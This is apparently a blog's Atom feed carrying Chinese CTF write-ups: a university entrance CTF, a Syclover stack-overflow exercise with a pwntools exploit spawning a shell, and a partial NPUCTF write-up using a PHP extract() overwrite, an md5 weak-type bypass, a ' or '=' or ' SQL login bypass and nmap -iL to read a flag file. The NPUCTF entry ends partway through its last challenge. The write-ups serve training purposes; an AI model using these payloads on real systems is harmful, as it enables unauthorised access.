<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iosmosis&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://iosmosis.github.io/"/>
  <updated>2018-06-10T13:49:34.484Z</updated>
  <id>http://iosmosis.github.io/</id>
  
  <author>
    <name>iosmosis</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2018北邮自招复试-CTF-Writeup</title>
    <link href="http://iosmosis.github.io/2018/06/10/%E5%8C%97%E9%82%AE%E8%87%AA%E6%8B%9B%E5%A4%8D%E8%AF%95-CTF-Writeup/"/>
    <id>http://iosmosis.github.io/2018/06/10/北邮自招复试-CTF-Writeup/</id>
    <published>2018-06-10T13:41:48.000Z</published>
    <updated>2018-06-10T13:49:34.484Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>右键查看网站源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    	</div><div class="line">    	<span class="comment">&lt;!--</span></div><div class="line">    	index.php</div><div class="line">    	&lt;?php     </div><div class="line">		$flag='xxx';     </div><div class="line">		extract($_GET);     </div><div class="line">		if(isset($gift))&#123;        </div><div class="line">		    $content=trim(file_get_contents($flag));</div><div class="line">		    if($gift==$content)&#123; </div><div class="line">		       echo'flag';     &#125;</div><div class="line">		     else&#123;       </div><div class="line">		       echo'flag has been encrypted';&#125;   </div><div class="line">		     &#125; </div><div class="line">		?&gt;</div><div class="line">		--&gt;</div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>发现hint 存在flag这个文件 读入到content<br>输入gift 如果 gift=content则输出flag<br>尝试访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.112.163.9:8888/web2/index.php?gift=</div></pre></td></tr></table></figure></p>
<p>返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Warning: file_get_contents(xxx): failed to open stream: No such file or directory in /var/www/html/web2/index.php on line 6</div><div class="line">flag is OHCG&#123;82s5r276o3006q2054048p6799op543q&#125;</div></pre></td></tr></table></figure></p>
<p>根据提示 flag has been encrypted<br>所以猜测flag被某种方式加密<br>猜测为凯撒加密<br>用工具爆破了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">PIDH&#123;82t5s276p3006r2054048q6799pq543r&#125;</div><div class="line"></div><div class="line">QJEI&#123;82u5t276q3006s2054048r6799qr543s&#125;</div><div class="line"></div><div class="line">RKFJ&#123;82v5u276r3006t2054048s6799rs543t&#125;</div><div class="line"></div><div class="line">SLGK&#123;82w5v276s3006u2054048t6799st543u&#125;</div><div class="line"></div><div class="line">TMHL&#123;82x5w276t3006v2054048u6799tu543v&#125;</div><div class="line"></div><div class="line">UNIM&#123;82y5x276u3006w2054048v6799uv543w&#125;</div><div class="line"></div><div class="line">VOJN&#123;82z5y276v3006x2054048w6799vw543x&#125;</div><div class="line"></div><div class="line">WPKO&#123;82a5z276w3006y2054048x6799wx543y&#125;</div><div class="line"></div><div class="line">XQLP&#123;82b5a276x3006z2054048y6799xy543z&#125;</div><div class="line"></div><div class="line">YRMQ&#123;82c5b276y3006a2054048z6799yz543a&#125;</div><div class="line"></div><div class="line">ZSNR&#123;82d5c276z3006b2054048a6799za543b&#125;</div><div class="line"></div><div class="line">ATOS&#123;82e5d276a3006c2054048b6799ab543c&#125;</div><div class="line"></div><div class="line">BUPT&#123;82f5e276b3006d2054048c6799bc543d&#125; //flag</div><div class="line"></div><div class="line">CVQU&#123;82g5f276c3006e2054048d6799cd543e&#125;</div><div class="line"></div><div class="line">DWRV&#123;82h5g276d3006f2054048e6799de543f&#125;</div><div class="line"></div><div class="line">EXSW&#123;82i5h276e3006g2054048f6799ef543g&#125;</div><div class="line"></div><div class="line">FYTX&#123;82j5i276f3006h2054048g6799fg543h&#125;</div><div class="line"></div><div class="line">GZUY&#123;82k5j276g3006i2054048h6799gh543i&#125;</div><div class="line"></div><div class="line">HAVZ&#123;82l5k276h3006j2054048i6799hi543j&#125;</div><div class="line"></div><div class="line">IBWA&#123;82m5l276i3006k2054048j6799ij543k&#125;</div><div class="line"></div><div class="line">JCXB&#123;82n5m276j3006l2054048k6799jk543l&#125;</div><div class="line"></div><div class="line">KDYC&#123;82o5n276k3006m2054048l6799kl543m&#125;</div><div class="line"></div><div class="line">LEZD&#123;82p5o276l3006n2054048m6799lm543n&#125;</div><div class="line"></div><div class="line">MFAE&#123;82q5p276m3006o2054048n6799mn543o&#125;</div><div class="line"></div><div class="line">NGBF&#123;82r5q276n3006p2054048o6799no543p&#125;</div><div class="line"></div><div class="line">OHCG&#123;82s5r276o3006q2054048p6799op543q&#125;</div></pre></td></tr></table></figure></p>
<p>因为提示flag格式为BUPT所以得到flag</p>
<p>BUPT{82f5e276b3006d2054048c6799bc543d}</p>
<h2 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h2><p>题目提示 1s中回答随机产生的数学题<br>运算符号不发生改变 所以用python先取出需要运算的数然后进行运算 最后post提交即可<br>EXP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2, urllib</div><div class="line"></div><div class="line">data = &#123;<span class="string">'v'</span> : <span class="string">'1'</span>&#125;</div><div class="line">f = urllib2.urlopen(</div><div class="line">        url     = <span class="string">'http://10.112.163.9:8888/web1/index.php'</span>,</div><div class="line">        <span class="comment">#data    = urllib.urlencode(data)</span></div><div class="line">  )</div><div class="line">res = f.readlines()</div><div class="line">temp = str(res).split(<span class="string">'&lt;br/&gt;'</span>)</div><div class="line"><span class="keyword">print</span> temp</div><div class="line">res1 = temp[len(temp)<span class="number">-1</span>]</div><div class="line"><span class="keyword">print</span> res1</div><div class="line">temp = str(res1).split(<span class="string">'='</span>)</div><div class="line">res2 = temp[len(temp)<span class="number">-6</span>]</div><div class="line"><span class="keyword">print</span> res2</div><div class="line">res =res2</div><div class="line">re1 = str(res).split(<span class="string">'*'</span>)</div><div class="line"><span class="keyword">print</span> re1</div><div class="line">a = re1[len(re1)<span class="number">-3</span>]</div><div class="line">re2 = re1[len(re1)<span class="number">-2</span>]</div><div class="line">re2 = str(re2).split(<span class="string">'+'</span>)</div><div class="line"><span class="keyword">print</span> re2 </div><div class="line">b = re2[len(re2)<span class="number">-2</span>]</div><div class="line"><span class="keyword">print</span> b</div><div class="line">q = int(a)*int(b)</div><div class="line"><span class="keyword">print</span> q //前两位相乘</div><div class="line">c = re2[len(re2)<span class="number">-1</span>]</div><div class="line"><span class="keyword">print</span> c</div><div class="line">re3 = re1[len(re1)<span class="number">-1</span>]</div><div class="line"><span class="keyword">print</span> re3</div><div class="line">re3 = str(re3).split(<span class="string">'('</span>)</div><div class="line"><span class="keyword">print</span> re3</div><div class="line">re3 = re3[len(re3)<span class="number">-1</span>]</div><div class="line">re3 = str(re3).split(<span class="string">')'</span>)</div><div class="line"><span class="keyword">print</span> re3</div><div class="line">re3 = re3[len(re3)<span class="number">-2</span>]</div><div class="line"><span class="keyword">print</span> re3</div><div class="line">re3 = str(re3).split(<span class="string">'+'</span>)</div><div class="line"><span class="keyword">print</span> re3</div><div class="line">d = int(re3[len(re3)<span class="number">-2</span>])+int(re3[len(re3)<span class="number">-1</span>])</div><div class="line"><span class="keyword">print</span> d //括号里面的相加</div><div class="line">p = int(c)*int(d)</div><div class="line"><span class="keyword">print</span> p //括号外相乘</div><div class="line">ss = int(p)+int(q)</div><div class="line"><span class="keyword">print</span> ss //执行完整的运算</div><div class="line">data = &#123;<span class="string">'v'</span> : ss&#125;</div><div class="line">f = urllib2.urlopen(</div><div class="line">        url     = <span class="string">'http://10.112.163.9:8888/web1/index.php'</span>,</div><div class="line">        data    = urllib.urlencode(data)</div><div class="line">  )</div><div class="line"><span class="keyword">print</span> f.read()</div></pre></td></tr></table></figure></p>
<p>运行即可获取flag<br>flag is BUPT{7b28f26afca4bc2654bd83d2a2bdc546}</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Kaisa"><a href="#Kaisa" class="headerlink" title="Kaisa"></a>Kaisa</h2><p>运行程序开了下流程 需要输入flag 通过题目可知应该是凯撒加密题目<br>导入到IDA分析<br>shift+F12搜索字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">.rdata:0040789E	0000000D	C	KERNEL32.dll</div><div class="line">.data:00408035	00000023	C	FAE&#123;Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?&#125;</div><div class="line">.data:00408058	00000017	C	Flag is your input!!!!</div><div class="line">.data:00408074	00000014	C	input your flag?\n&gt;&gt;</div><div class="line">.data:00408318	00000006	C	 \t-\r]</div></pre></td></tr></table></figure></p>
<p>发现一个特殊字符串 FAE{Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?}<br>通过交叉引用定位到关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">  int result; // eax</div><div class="line">  char v9[64]; // [esp+Ch] [ebp-40h]</div><div class="line"></div><div class="line">  sub_4012C9(aInputYourFlag);</div><div class="line">  scanf(aS, v9);</div><div class="line">  v3 = strlen(v9);</div><div class="line">  v4 = 0;</div><div class="line">  if ( v3 &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    v5 = byte_408030;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      v6 = v9[v4];</div><div class="line">      if ( (unsigned __int8)v6 &lt; 0x61u || (unsigned __int8)v6 &gt; 0x7Au )</div><div class="line">      &#123;</div><div class="line">        if ( (unsigned __int8)v6 &gt;= 0x41u &amp;&amp; (unsigned __int8)v6 &lt;= 0x5Au )</div><div class="line">          v6 = (unsigned __int16)((unsigned __int8)(v6 + v5 - 65) % 26) + 65;</div><div class="line">      &#125;</div><div class="line">      else</div><div class="line">      &#123;</div><div class="line">        v6 = (unsigned __int16)((unsigned __int8)(v6 + v5 - 97) % 26) + 97;</div><div class="line">      &#125;</div><div class="line">      v9[v4++] = v6;</div><div class="line">    &#125;</div><div class="line">    while ( v4 &lt; v3 );</div><div class="line">  &#125;</div><div class="line">  v7 = 0;</div><div class="line">  if ( v3 &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">LABEL_13:</div><div class="line">    sub_4012C9(aFlagIsYourInpu);</div><div class="line">    if ( --stru_408088._cnt &lt; 0 )</div><div class="line">      _filbuf(&amp;stru_408088);</div><div class="line">    else</div><div class="line">      ++stru_408088._ptr;</div><div class="line">    if ( --stru_408088._cnt &lt; 0 )</div><div class="line">      _filbuf(&amp;stru_408088);</div><div class="line">    else</div><div class="line">      ++stru_408088._ptr;</div><div class="line">    result = 0;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    while ( v9[v7] == byte_408034[v7] )</div><div class="line">    &#123;</div><div class="line">      if ( ++v7 &gt;= v3 )</div><div class="line">        goto LABEL_13;</div><div class="line">    &#125;</div><div class="line">    result = -1;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>查看V5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.data:00408034 byte_408034     db &apos;M&apos;                  ; DATA XREF: _main+95↑r</div><div class="line">.data:00408035 aFaeVl13lT3Gpcj db &apos;FAE&#123;Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?&#125;&apos;,0</div><div class="line">.data:00408058 aFlagIsYourInpu db &apos;Flag is your input!!!!&apos;,0</div></pre></td></tr></table></figure></p>
<p>找到密文 MFAE{Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?}<br>通过暴力跑位移得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">NGBF&#123;Wm1_3M_U3_hQDk_EymdF_D1Szu?!?&#125;</div><div class="line">OHCG&#123;Xn1_3N_V3_iREl_FzneG_E1Tav?!?&#125;</div><div class="line">PIDH&#123;Yo1_3O_W3_jSFm_GaofH_F1Ubw?!?&#125;</div><div class="line">QJEI&#123;Zp1_3P_X3_kTGn_HbpgI_G1Vcx?!?&#125;</div><div class="line">RKFJ&#123;Aq1_3Q_Y3_lUHo_IcqhJ_H1Wdy?!?&#125;</div><div class="line">SLGK&#123;Br1_3R_Z3_mVIp_JdriK_I1Xez?!?&#125;</div><div class="line">TMHL&#123;Cs1_3S_A3_nWJq_KesjL_J1Yfa?!?&#125;</div><div class="line">UNIM&#123;Dt1_3T_B3_oXKr_LftkM_K1Zgb?!?&#125;</div><div class="line">VOJN&#123;Eu1_3U_C3_pYLs_MgulN_L1Ahc?!?&#125;</div><div class="line">WPKO&#123;Fv1_3V_D3_qZMt_NhvmO_M1Bid?!?&#125;</div><div class="line">XQLP&#123;Gw1_3W_E3_rANu_OiwnP_N1Cje?!?&#125;</div><div class="line">YRMQ&#123;Hx1_3X_F3_sBOv_PjxoQ_O1Dkf?!?&#125;</div><div class="line">ZSNR&#123;Iy1_3Y_G3_tCPw_QkypR_P1Elg?!?&#125;</div><div class="line">ATOS&#123;Jz1_3Z_H3_uDQx_RlzqS_Q1Fmh?!?&#125;</div><div class="line">BUPT&#123;Ka1_3A_I3_vERy_SmarT_R1Gni?!?&#125; //flag</div><div class="line">CVQU&#123;Lb1_3B_J3_wFSz_TnbsU_S1Hoj?!?&#125;</div><div class="line">DWRV&#123;Mc1_3C_K3_xGTa_UoctV_T1Ipk?!?&#125;</div><div class="line">EXSW&#123;Nd1_3D_L3_yHUb_VpduW_U1Jql?!?&#125;</div><div class="line">FYTX&#123;Oe1_3E_M3_zIVc_WqevX_V1Krm?!?&#125;</div><div class="line">GZUY&#123;Pf1_3F_N3_aJWd_XrfwY_W1Lsn?!?&#125;</div><div class="line">HAVZ&#123;Qg1_3G_O3_bKXe_YsgxZ_X1Mto?!?&#125;</div><div class="line">IBWA&#123;Rh1_3H_P3_cLYf_ZthyA_Y1Nup?!?&#125;</div><div class="line">JCXB&#123;Si1_3I_Q3_dMZg_AuizB_Z1Ovq?!?&#125;</div><div class="line">KDYC&#123;Tj1_3J_R3_eNAh_BvjaC_A1Pwr?!?&#125;</div><div class="line">LEZD&#123;Uk1_3K_S3_fOBi_CwkbD_B1Qxs?!?&#125;</div><div class="line">MFAE&#123;Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?&#125;</div></pre></td></tr></table></figure></p>
<p>得到flag BUPT{Ka1_3A_I3_vERy_SmarT_R1Gni?!?}</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;easyphp&quot;&gt;&lt;a href=&quot;#easyphp&quot; class=&quot;headerlink&quot; title=&quot;easyphp
    
    </summary>
    
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
      <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
    
      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
    
      <category term="BUPT" scheme="http://iosmosis.github.io/tags/BUPT/"/>
    
  </entry>
  
  <entry>
    <title>Syclover-Pwn-练习题</title>
    <link href="http://iosmosis.github.io/2018/06/09/Syclover-Pwn-%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <id>http://iosmosis.github.io/2018/06/09/Syclover-Pwn-练习题/</id>
    <published>2018-06-09T09:56:41.000Z</published>
    <updated>2018-06-10T13:50:04.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec stack1</div><div class="line">[*] <span class="string">'/home/ios/stack1'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
<p>开启NX保护<br>IAD载入分析代码<br>main()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  char v4; // [rsp+0h] [rbp-20h]</div><div class="line"></div><div class="line">  puts(&quot;get input&quot;);</div><div class="line">  scanf(&quot;%s&quot;, &amp;v4);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>get_shell()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int get_shell()</div><div class="line">&#123;</div><div class="line">  return system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>简单栈溢出 已给shell 所以覆盖v4之后ret到get_shell 地址即可<br>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./stack1'</span>)</div><div class="line">sys_addr=<span class="number">0x000000000004005B6</span></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> +<span class="string">'b'</span>*<span class="number">8</span> +p64(sys_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>成功取得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python stack1.py</div><div class="line">[+] Starting local process &apos;./stack1&apos;: pid 2228</div><div class="line">[*] Switching to interactive mode</div><div class="line">get input</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">$ </div><div class="line">[*] Interrupted</div><div class="line">[*] Stopped process &apos;./stack1&apos; (pid 2228)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;stack1&quot;&gt;&lt;a href=&quot;#stack1&quot; class=&quot;headerlink&quot; title=&quot;stack1&quot;&gt;&lt;/a&gt;stack1&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
      <category term="Syclover" scheme="http://iosmosis.github.io/tags/Syclover/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF部分Writeup</title>
    <link href="http://iosmosis.github.io/2018/05/13/NPUCTF%E9%83%A8%E5%88%86Writeup/"/>
    <id>http://iosmosis.github.io/2018/05/13/NPUCTF部分Writeup/</id>
    <published>2018-05-13T07:39:42.000Z</published>
    <updated>2018-05-27T11:00:03.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="/2018/05/13/NPUCTF部分Writeup/1.jpg" alt="ida1"></p>
<p>查看源码<br><img src="/2018/05/13/NPUCTF部分Writeup/2.jpg" alt="ida1"><br>得到Flag : flag{begin_to_npuctf}</p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2></the></li>
</ul>
<p><img src="/2018/05/13/NPUCTF部分Writeup/3.jpg" alt="ida1"><br>猜测应该是js算法题目</p>
<p>查看源码发现主要算法<br><img src="/2018/05/13/NPUCTF部分Writeup/4.jpg" alt="ida1"></p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var b = &quot;56ab34c15b73a457069c58a43fcfc640&quot;;</div><div class="line">var d = 0x0;</div><div class="line">var e = a.substr(0x8, 0x5);</div><div class="line">if ($.md5(e) == b.replace(/3/ig, ++d+1).replace(/8/ig, &apos;e&apos;))</div></pre></td></tr></table></figure></p>
<p>通过控制台可以获得e<br><img src="/2018/05/13/NPUCTF部分Writeup/5.jpg" alt="ida1"><br>解密可以获得9-13位 happy<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (f.substr(0x5, 0x2) == &quot;be&quot; &amp;&amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;) &#123;</div></pre></td></tr></table></figure></p>
<p>可得 6 7位为 be<br>解密  327a6c4304ad5938eaf0efb6cc3e53dc 可获得 0-3位为 flag</p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/6.jpg" alt="ida1"></p>
<p>运行可以获得g=np<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (r.substr((++d) * 0x3, 0x6) == g.concat(&quot;uctf&quot;) &amp;&amp; c.test(a)) &#123;</div></pre></td></tr></table></figure></p>
<p>分析可知 得到的g和uctf进行拼接 得到 npuctf 15-22位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;pre name=&quot;code&quot; class=&quot;javascript&quot; style=&quot;font-size: 13.3333px;&quot;&gt;r.charCodeAt(--d) - 0x19 == r.charCodeAt(--d) //r[1]-0x19==r[0]</div><div class="line">之后根据正则可知r[0]=&apos;_&apos;</div></pre></td></tr></table></figure></p>
<p> 倒回去看r变量的判断</p>
<p>0的值为_下划线unicode码加25</p>
<p>所以在控制台输入下面3条代码，即可得r两个相同的字符为xx</p>
<p>var r = ‘_’</p>
<p>console.log(r.charCodeAt(0))</p>
<p>console.log(String.fromCharCode(95+25))<br>所以最后拼接可得<br>flag{be_happy_xxnpuctf}</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>题目：你需要懂一些Linux命令，已经为你装好了某著名黑客工具。<br><img src="/2018/05/13/NPUCTF部分Writeup/7.jpg" alt="ida1"><br>测试可知 可以执行一些命令 并且 ls列出了flag所在目录<br><img src="/2018/05/13/NPUCTF部分Writeup/8.jpg" alt="ida1"><br>但是却无法使用 cd cat 等一系列命令</p>
<p>右键查看源码<br><img src="/2018/05/13/NPUCTF部分Writeup/9.jpg" alt="ida1"><br>发现提示 可以猜测应该 是可以使用nmap<br>所以使用命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -iL /tmp/flag/flag.txt</div></pre></td></tr></table></figure></p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/10.jpg" alt="ida1"><br>得到Flag : flag{nice_Command}</p>
<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="/2018/05/13/NPUCTF部分Writeup/11.jpg" alt="ida1"><br>进入发现需要登录</p>
<p>右键查看源码得到提示<br><img src="/2018/05/13/NPUCTF部分Writeup/12.jpg" alt="ida1"><br>这里存在PHP弱类型漏洞 提交name=240610708 pass=QNKCDZO 成功绕过</p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/13.jpg" alt="ida1"></p>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p> 根据放的hint可尝试万能密码绕过<br>提交 ‘or’=’or’ 成功绕过</p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/14.jpg" alt="ida1"></p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>提示了name为 npusec 但是密码未知所以这里猜测需要爆破密码</p>
<p>通过robots.txt泄露 </p>
<p><img src="/2018/05/13/NPUCTF部分Writeup/15.jpg" alt="ida1"><br>得到 密码字典 所以进行爆破即可</p>
